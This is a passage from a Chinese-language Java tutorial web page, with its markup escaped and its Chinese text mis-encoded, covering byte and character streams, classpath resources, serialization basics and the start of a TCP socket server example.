&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// è¯»å–åˆ°ç¼“å†²åŒº
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;read &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34; bytes.&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>é™¤&lt;code>FileInputStream&lt;/code>ä»¥å¤–è¿˜æœ‰&lt;code>ByteArrayInputStream&lt;/code>å¯ä»¥åœ¨å†…å­˜ä¸­æ¨¡æ‹Ÿä¸€ä¸ª&lt;code>InputStream&lt;/code>ï¼Œå®é™…ä¸Šæ˜¯æŠŠä¸€ä¸ª&lt;code>byte[]&lt;/code>æ•°ç»„åœ¨å†…å­˜ä¸­å˜æˆä¸€ä¸ª&lt;code>InputStream&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">72&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">101&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">108&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">108&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">111&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">33&lt;/span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;code>OutputStream&lt;/code>è¿˜æä¾›äº†ä¸€ä¸ª&lt;code>flush()&lt;/code>æ–¹æ³•ï¼Œå®ƒçš„ç›®çš„æ˜¯å°†ç¼“å†²åŒºçš„å†…å®¹çœŸæ­£è¾“å‡ºåˆ°ç›®çš„åœ°&lt;/li>
&lt;/ul>
&lt;h3 id="å­—ç¬¦æµè¯»å†™">å­—ç¬¦æµè¯»å†™&lt;/h3>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">InputStream&lt;/th>
&lt;th style="text-align:left">Reader&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">å­—èŠ‚æµï¼Œä»¥&lt;code>byte&lt;/code>ä¸ºå•ä½&lt;/td>
&lt;td style="text-align:left">å­—ç¬¦æµï¼Œä»¥&lt;code>char&lt;/code>ä¸ºå•ä½&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">è¯»å–å­—èŠ‚ï¼ˆ-1ï¼Œ0~255ï¼‰ï¼š&lt;code>int read()&lt;/code>&lt;/td>
&lt;td style="text-align:left">è¯»å–å­—ç¬¦ï¼ˆ-1ï¼Œ0~65535ï¼‰ï¼š&lt;code>int read()&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">è¯»åˆ°å­—èŠ‚æ•°ç»„ï¼š&lt;code>int read(byte[] b)&lt;/code>&lt;/td>
&lt;td style="text-align:left">è¯»åˆ°å­—ç¬¦æ•°ç»„ï¼š&lt;code>int read(char[] c)&lt;/code>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>é™¤äº†ç‰¹æ®Šçš„&lt;code>CharArrayReader&lt;/code>å’Œ&lt;code>StringReader&lt;/code>ï¼Œæ™®é€šçš„&lt;code>Reader&lt;/code>å®é™…ä¸Šæ˜¯åŸºäº&lt;code>InputStream&lt;/code>æ„é€ çš„ï¼Œå› ä¸º&lt;code>Reader&lt;/code>éœ€è¦ä»&lt;code>InputStream&lt;/code>ä¸­è¯»å…¥å­—èŠ‚æµï¼ˆ&lt;code>byte&lt;/code>ï¼‰ï¼Œç„¶åï¼Œæ ¹æ®ç¼–ç è®¾ç½®ï¼Œå†è½¬æ¢ä¸º&lt;code>char&lt;/code>å°±å¯ä»¥å®ç°å­—ç¬¦æµã€‚å¦‚æœæˆ‘ä»¬æŸ¥çœ‹&lt;code>FileReader&lt;/code>çš„æºç ï¼Œå®ƒåœ¨å†…éƒ¨å®é™…ä¸ŠæŒæœ‰ä¸€ä¸ª&lt;code>FileInputStream&lt;/code>ã€‚&lt;/p>
&lt;p>æ—¢ç„¶&lt;code>Reader&lt;/code>æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªåŸºäº&lt;code>InputStream&lt;/code>çš„&lt;code>byte&lt;/code>åˆ°&lt;code>char&lt;/code>çš„è½¬æ¢å™¨ï¼Œé‚£ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬å·²ç»æœ‰ä¸€ä¸ª&lt;code>InputStream&lt;/code>ï¼Œæƒ³æŠŠå®ƒè½¬æ¢ä¸º&lt;code>Reader&lt;/code>ï¼Œæ˜¯å®Œå…¨å¯è¡Œçš„ã€‚&lt;code>InputStreamReader&lt;/code>å°±æ˜¯è¿™æ ·ä¸€ä¸ªè½¬æ¢å™¨ï¼Œå®ƒå¯ä»¥æŠŠä»»ä½•&lt;code>InputStream&lt;/code>è½¬æ¢ä¸º&lt;code>Reader&lt;/code>ã€‚ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// æŒæœ‰InputStream:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;src/readme.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// å˜æ¢ä¸ºReader:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Reader&lt;/span> &lt;span style="color:#111">reader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InputStreamReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;UTF-8&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ„é€ &lt;code>InputStreamReader&lt;/code>æ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä¼ å…¥&lt;code>InputStream&lt;/code>ï¼Œè¿˜éœ€è¦æŒ‡å®šç¼–ç ï¼Œå°±å¯ä»¥å¾—åˆ°ä¸€ä¸ª&lt;code>Reader&lt;/code>å¯¹è±¡ã€‚ä¸Šè¿°ä»£ç å¯ä»¥é€šè¿‡&lt;code>try (resource)&lt;/code>æ›´ç®€æ´åœ°æ”¹å†™å¦‚ä¸‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Reader&lt;/span> &lt;span style="color:#111">reader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InputStreamReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;src/readme.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#d88200">&amp;#34;UTF-8&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// TODO:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸Šè¿°ä»£ç å®é™…ä¸Šå°±æ˜¯&lt;code>FileReader&lt;/code>çš„ä¸€ç§å®ç°æ–¹å¼ã€‚&lt;/p>
&lt;p>ä½¿ç”¨&lt;code>try (resource)&lt;/code>ç»“æ„æ—¶ï¼Œå½“æˆ‘ä»¬å…³é—­&lt;code>Reader&lt;/code>æ—¶ï¼Œå®ƒä¼šåœ¨å†…éƒ¨è‡ªåŠ¨è°ƒç”¨&lt;code>InputStream&lt;/code>çš„&lt;code>close()&lt;/code>æ–¹æ³•ï¼Œæ‰€ä»¥ï¼Œåªéœ€è¦å…³é—­æœ€å¤–å±‚çš„&lt;code>Reader&lt;/code>å¯¹è±¡å³å¯&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">OutputStream&lt;/th>
&lt;th style="text-align:left">Writer&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">å­—èŠ‚æµï¼Œä»¥&lt;code>byte&lt;/code>ä¸ºå•ä½&lt;/td>
&lt;td style="text-align:left">å­—ç¬¦æµï¼Œä»¥&lt;code>char&lt;/code>ä¸ºå•ä½&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">å†™å…¥å­—èŠ‚ï¼ˆ0~255ï¼‰ï¼š&lt;code>void write(int b)&lt;/code>&lt;/td>
&lt;td style="text-align:left">å†™å…¥å­—ç¬¦ï¼ˆ0~65535ï¼‰ï¼š&lt;code>void write(int c)&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">å†™å…¥å­—èŠ‚æ•°ç»„ï¼š&lt;code>void write(byte[] b)&lt;/code>&lt;/td>
&lt;td style="text-align:left">å†™å…¥å­—ç¬¦æ•°ç»„ï¼š&lt;code>void write(char[] c)&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">æ— å¯¹åº”æ–¹æ³•&lt;/td>
&lt;td style="text-align:left">å†™å…¥Stringï¼š&lt;code>void write(String s)&lt;/code>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>é™¤äº†&lt;code>CharArrayWriter&lt;/code>å’Œ&lt;code>StringWriter&lt;/code>å¤–ï¼Œæ™®é€šçš„Writerå®é™…ä¸Šæ˜¯åŸºäº&lt;code>OutputStream&lt;/code>æ„é€ çš„ï¼Œå®ƒæ¥æ”¶&lt;code>char&lt;/code>ï¼Œç„¶ååœ¨å†…éƒ¨è‡ªåŠ¨è½¬æ¢æˆä¸€ä¸ªæˆ–å¤šä¸ª&lt;code>byte&lt;/code>ï¼Œå¹¶å†™å…¥&lt;code>OutputStream&lt;/code>ã€‚å› æ­¤ï¼Œ&lt;code>OutputStreamWriter&lt;/code>å°±æ˜¯ä¸€ä¸ªå°†ä»»æ„çš„&lt;code>OutputStream&lt;/code>è½¬æ¢ä¸º&lt;code>Writer&lt;/code>çš„è½¬æ¢å™¨ï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>try (Writer writer = new OutputStreamWriter(new FileOutputStream(&amp;#34;readme.txt&amp;#34;), &amp;#34;UTF-8&amp;#34;)) {
// TODO:
}
&lt;/code>&lt;/pre>&lt;p>ä¸Šè¿°ä»£ç å®é™…ä¸Šå°±æ˜¯&lt;code>FileWriter&lt;/code>çš„ä¸€ç§å®ç°æ–¹å¼ï¼Œè¿™å’Œä¸Šé¢çš„&lt;code>InputStreamReader&lt;/code>æ˜¯ä¸€æ ·çš„&lt;/p>
&lt;h3 id="filteræ¨¡å¼">Filteræ¨¡å¼&lt;/h3>
&lt;p>Filteræ¨¡å¼å¯ä»¥åœ¨è¿è¡ŒæœŸåŠ¨æ€å¢åŠ åŠŸèƒ½ï¼Œåˆç§°Decoratoræ¨¡å¼&lt;/p>
&lt;h3 id="classpath">classpath&lt;/h3>
&lt;p>ä»classpathè¯»å–æ–‡ä»¶å°±å¯ä»¥é¿å…ä¸åŒç¯å¢ƒä¸‹æ–‡ä»¶è·¯å¾„ä¸ä¸€è‡´çš„é—®é¢˜ï¼Œåœ¨classpathä¸­çš„èµ„æºæ–‡ä»¶ï¼Œè·¯å¾„æ€»æ˜¯ä»¥&lt;code>ï¼&lt;/code>å¼€å¤´ï¼Œæˆ‘ä»¬å…ˆè·å–å½“å‰çš„&lt;code>Class&lt;/code>å¯¹è±¡ï¼Œç„¶åè°ƒç”¨&lt;code>getResourceAsStream()&lt;/code>å°±å¯ä»¥ç›´æ¥ä»classpathè¯»å–ä»»æ„çš„èµ„æºæ–‡ä»¶ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getResourceAsStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/default.properties&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// TODO:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è°ƒç”¨&lt;code>getResourceAsStream()&lt;/code>éœ€è¦ç‰¹åˆ«æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œå¦‚æœèµ„æºæ–‡ä»¶ä¸å­˜åœ¨ï¼Œå®ƒå°†è¿”å›&lt;code>null&lt;/code>ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦æ£€æŸ¥è¿”å›çš„&lt;code>InputStream&lt;/code>æ˜¯å¦ä¸º&lt;code>null&lt;/code>ï¼Œå¦‚æœä¸º&lt;code>null&lt;/code>ï¼Œè¡¨ç¤ºèµ„æºæ–‡ä»¶åœ¨classpathä¸­æ²¡æœ‰æ‰¾åˆ°ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getResourceAsStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/default.properties&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// TODO:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¦‚æœæˆ‘ä»¬æŠŠé»˜è®¤çš„é…ç½®æ”¾åˆ°jaråŒ…ä¸­ï¼Œå†ä»å¤–éƒ¨æ–‡ä»¶ç³»ç»Ÿè¯»å–ä¸€ä¸ªå¯é€‰çš„é…ç½®æ–‡ä»¶ï¼Œå°±å¯ä»¥åšåˆ°æ—¢æœ‰é»˜è®¤çš„é…ç½®æ–‡ä»¶ï¼Œåˆå¯ä»¥è®©ç”¨æˆ·è‡ªå·±ä¿®æ”¹é…ç½®ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Properties&lt;/span> &lt;span style="color:#111">props&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Properties&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">props&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">load&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">inputStreamFromClassPath&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/default.properties&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">props&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">load&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">inputStreamFromFile&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./conf.properties&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™æ ·è¯»å–é…ç½®æ–‡ä»¶ï¼Œåº”ç”¨ç¨‹åºå¯åŠ¨å°±æ›´åŠ çµæ´»&lt;/p>
&lt;h3 id="åºåˆ—åŒ–ååºåˆ—åŒ–">åºåˆ—åŒ–&amp;amp;ååºåˆ—åŒ–&lt;/h3>
&lt;p>åºåˆ—åŒ–æ˜¯æŒ‡æŠŠä¸€ä¸ªJavaå¯¹è±¡å˜æˆäºŒè¿›åˆ¶å†…å®¹ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ª&lt;code>byte[]&lt;/code>æ•°ç»„&lt;/p>
&lt;p>ä¸€ä¸ªJavaå¯¹è±¡è¦èƒ½åºåˆ—åŒ–ï¼Œå¿…é¡»å®ç°ä¸€ä¸ªç‰¹æ®Šçš„&lt;code>java.io.Serializable&lt;/code>æ¥å£(æ ‡è®°æ¥å£Marker Interface)&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Serializable&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ååºåˆ—åŒ–æ—¶ï¼Œç”±JVMç›´æ¥æ„é€ å‡ºJavaå¯¹è±¡ï¼Œä¸è°ƒç”¨æ„é€ æ–¹æ³•ï¼Œæ„é€ æ–¹æ³•å†…éƒ¨çš„ä»£ç ï¼Œåœ¨ååºåˆ—åŒ–æ—¶æ ¹æœ¬ä¸å¯èƒ½æ‰§è¡Œï¼ˆåŒPHPï¼‰ï¼Œå¯è®¾ç½®&lt;code>serialVersionUID&lt;/code>ä½œä¸ºç‰ˆæœ¬å·&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Serializable&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">long&lt;/span> &lt;span style="color:#111">serialVersionUID&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">2709425275741743919L&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯ä»¥é¿å…classå®šä¹‰å˜åŠ¨å¯¼è‡´çš„ä¸å…¼å®¹ï¼Œé€šå¸¸å¯ä»¥ç”±IDEè‡ªåŠ¨ç”Ÿæˆ&lt;/p>
&lt;h2 id="ç½‘ç»œç¼–ç¨‹">ç½‘ç»œç¼–ç¨‹&lt;/h2>
&lt;h3 id="socket---tcp">Socket - TCP&lt;/h3>
&lt;p>ä¸€ä¸ªSocketå°±æ˜¯ç”±ipå’Œportæ„æˆï¼ŒSocketç¼–ç¨‹å°±æ˜¯æŒ‡ä¸¤ä¸ªè¿›ç¨‹ä¹‹é—´çš„ç½‘ç»œé€šä¿¡ï¼ŒServer&amp;amp;Client&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Server.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.net.ServerSocket&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.net.Socket&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.nio.charset.StandardCharsets&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Server&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
